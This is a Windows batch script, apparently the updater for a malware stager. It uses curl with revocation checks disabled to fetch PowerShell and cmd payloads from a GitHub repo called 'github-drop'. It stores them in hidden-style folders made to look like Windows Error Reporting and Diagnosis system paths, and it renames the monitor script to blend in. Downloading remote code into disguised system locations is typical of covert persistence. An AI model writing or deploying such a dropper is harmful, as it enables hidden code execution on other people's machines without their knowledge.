@echo off
rem FORCE_UPDATE — pull freeze build by commit SHA (bypasses stale main CDN)
setlocal
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PIN=acc7a0c"
if not exist "%WD%" mkdir "%WD%" >nul 2>&1
attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_lib.ps1" "%WD%\own_gryxa.cmd" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 60 -o "%WD%\own_lib.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_lib.ps1?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 60 -o "%WD%\own_mon.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_mon.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 40 -o "%WD%\own_gryxa.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_gryxa.cmd?t=%RANDOM%"
if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul 2>&1
echo --- verify ---
findstr /C:"MONVER=" /C:"OWN_MON  BUILD" "%WD%\own_mon.cmd"
findstr /C:"OWN_LIB  BUILD" "%WD%\own_lib.ps1"
echo done pin=%PIN%
endlocal
